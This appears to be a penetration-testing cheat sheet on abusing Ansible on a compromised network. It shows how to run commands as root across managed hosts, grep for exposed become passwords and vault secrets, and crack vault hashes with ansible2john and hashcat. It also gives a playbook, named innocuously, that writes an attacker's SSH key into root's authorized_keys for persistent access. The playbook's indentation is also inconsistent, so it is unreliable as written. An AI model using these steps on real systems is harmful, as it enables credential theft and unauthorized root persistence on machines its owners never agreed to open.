# Ansible

### General

#### Inventory File \(controlled machines\):

```text
/etc/ansible/hosts
```

Usually ansibles SSH key is accepted on controlled machines \(usually with sudo/root privileges\).

#### Run Commands on inventory machines:

```text
ansible <group> -a "whoami"
```

"Become" can be used to su to a specific user \(default is root\).

```text
ansible <group> -a "whoami" --become
```

#### Exposed credentials

Grep for:

```text
ansible_become_pass
become_user
ANSIBLE_VAULT
```

Encrypted vault passwords can be cracked with `ansible2john` and hashcat with type 16900.

#### Misc

* Check for exposed credentials in syslog
* Check for playbook backups

### Playbooks

Write authorized\_keys file via playbook:

```text
---
- name: Get system info
    hosts: all
    gather_facts: true
    become: yes
    tasks:
      - name: Display info
        debug:
          msg: "..."
    - name: Create dir
      file:
        path: /root/.ssh
        state: directory
        mode: '0700'
        owner: root
        group: root
    - name: Create authorized_keys
      file:
        path: /root/.ssh/authorized_keys
        state: touch
        mode: '0600'
        owner: root
        group: root
    - name: Update keys
      lineinfile:
        path: /root/.ssh/authorized_keys
        line: "ssh-rsa ...."
        insertbefore: EOF
```

Run shell commands:

```text
- name: Cmd
    shell: whoami
    async: 10
    poll: 0
```

